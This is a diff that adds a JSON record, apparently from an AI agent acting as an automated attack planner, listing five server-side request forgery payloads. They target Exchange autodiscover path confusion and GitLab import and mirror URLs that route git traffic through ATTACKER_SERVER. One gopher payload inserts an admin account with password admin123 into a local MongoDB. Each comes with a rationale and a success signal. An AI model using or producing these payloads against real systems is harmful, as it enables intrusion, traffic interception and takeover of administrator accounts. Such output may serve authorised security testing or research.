@@ -1,0 +1,68 @@
+{
+ "key": "ssrf_5",
+ "model": "opencode/deepseek-v4.1-flash-free",
+ "class": "ssrf",
+ "variants": [
+  {
+   "endpoint": "POST /autodiscover/autodiscover.json",
+   "target_param": "Email",
+   "recon_evidence": "The Exchange front end accepts a JSON POST body with Email and Protocol fields and resolves the domain part of the Email value to decide which backend mailbox server handles the autodiscover request; a benign POST returns a 302/404 that reflects the resolved host.",
+   "planner_rationale": "Put the target host in the domain portion of the Email so the front end routes the backend request there while still matching the legitimate autodiscover.json handler.",
+   "vuln_class": "ssrf",
+   "payload": "autodiscover/autodiscover.json@outlook.com",
+   "injection_point": "body",
+   "expected_success_signal": "The JSON POST triggers server-side routing toward the named domain; the backend response (autodiscover XML/JSON or a host-specific error) proves the front end forwarded to a host derived from the payload.",
+   "confidence": 0.78,
+   "reasoning": "The domain portion of the Email value is reused as the backend routing target, so injecting an alternate domain steers front-end traffic server-side even when the request arrives as a JSON body rather than a query string. This mirrors the ProxyNotShell path-confusion primitive observed against the same autodiscover.json handler."
+  },
+  {
+   "endpoint": "GET /autodiscover/autodiscover.json",
+   "target_param": "Email",
+   "recon_evidence": "Unauthenticated GETs to autodiscover.json with an Email parameter return backend-specific error bodies whose contents change with the supplied domain, indicating the server performs a lookup against the host named after the @ sign.",
+   "planner_rationale": "Repoint the autodiscover backend fetch at a controlled host by abusing the domain used for Exchange autodiscover routing.",
+   "vuln_class": "ssrf",
+   "payload": "autodiscover/autodiscover.json@outlook.com",
+   "injection_point": "query",
+   "expected_success_signal": "The front end forwards the request toward the named host; the response/error proves server-side routing (e.g. 404 with autodiscover JSON from the upstream).",
+   "confidence": 0.82,
+   "reasoning": "The path-confusion payload abuses the email's domain portion as the routing target while the front end still matches the legitimate autodiscover path. The observed domain-dependent error bodies directly confirm that the Email domain drives server-side routing."
+  },
+  {
+   "endpoint": "POST /api/v4/projects/import",
+   "target_param": "url",
+   "recon_evidence": "The project import endpoint fetches the supplied git URL server-side and its response reflects the fetched repository's default branch; a URL whose path contains an http.<url>.* fragment is silently folded into git's per-URL configuration.",
+   "planner_rationale": "Smuggle an http.proxy setting into the import URL's path so git routes the fetch for that remote through the attacker listener.",
+   "vuln_class": "ssrf",
+   "payload": "http://user@google.com/.proxy=http://ATTACKER_SERVER:8500",
+   "injection_point": "query",
+   "expected_success_signal": "The repository's .git/config gains the attacker proxy; git HTTP traffic for that remote flows through the attacker listener.",
+   "confidence": 0.85,
+   "reasoning": "The path component of the import URL is parsed into per-URL git http config, so embedding .proxy= forces git's own client to use an attacker-controlled proxy during the server-side clone. The observed silent config folding confirms the injection reaches git rather than being rejected as a malformed URL."
+  },
+  {
+   "endpoint": "POST /api/v4/projects/:id/remote_mirrors",
+   "target_param": "url",
+   "recon_evidence": "Creating a remote mirror stores the URL and immediately performs a server-side fetch to validate it; mirror update errors echo back git client messages, showing the server hosts the git process that consumes the URL.",
+   "planner_rationale": "Use the mirror URL's path to inject a git http.proxy so the periodic mirror fetch is tunneled through us.",
+   "vuln_class": "ssrf",
+   "payload": "http://user@google.com/.proxy=http://ATTACKER_SERVER:8500",
+   "injection_point": "body",
+   "expected_success_signal": "The mirror's stored config inherits the attacker proxy and subsequent mirror sync attempts appear as requests at the attacker listener.",
+   "confidence": 0.7,
+   "reasoning": "Because the mirror fetch is executed by a server-side git process, the same per-URL http config injection applies when the URL arrives as a JSON body field. Confidence is lower because the request path depends on the mirror worker re-reading the injected config on its next sync rather than at creation time."
+  },
+  {
+   "endpoint": "POST /api/v2/integrations/webhook/test",
+   "target_param": "callback_url",
+   "recon_evidence": "The webhook test action connects to the supplied callback_url from the server and returns the raw bytes received, and it accepts arbitrary URL schemes without validating them, including gopher.",
+   "planner_rationale": "Use the unvalidated callback_url to deliver a pre-built gopher MongoDB insert frame to the local database port.",
+   "vuln_class": "ssrf",
+   "payload": "gopher://0.0.0.0:27017/_%a0%00%00%00%00%00%00%00%00%00%00%00%dd%07%00%00%00%00%00%00%8b%00%00%00%02insert%00%06%00%00%00users%00%02$db%00%0a%00%00%00percetron%00%04documents%00V%00%00%00%030%00N%00%00%00%02username%00%06%00%00%00admin%00%02password%00%09%00%00%00admin123%00%02permission%00%0e%00%00%00administrator%00%00%00",
+   "injection_point": "body",
+   "expected_success_signal": "An admin user row is created in the target MongoDB collection, observable through the application's user list or a follow-up authenticated login.",
+   "confidence": 0.75,
+   "reasoning": "The server-side fetcher passing bytes unvalidated to gopher lets the percent-encoded OP_INSERT frame reach MongoDB on 0.0.0.0:27017 as if a real client connected. This requires the fetcher to allow the gopher scheme and reach loopback, which the observed raw-byte echo supports."
+  }
+ ],
+ "raw_tail": "ollow-up authenticated login.\",\n    \"confidence\": 0.75,\n    \"reasoning\": \"The server-side fetcher passing bytes unvalidated to gopher lets the percent-encoded OP_INSERT frame reach MongoDB on 0.0.0.0:27017 as if a real client connected. This requires the fetcher to allow the gopher scheme and reach loopback, which the observed raw-byte echo supports.\"\n  }\n]\n\u001b[0m\n> build · deepseek-v4.1-flash-free\n"
+}
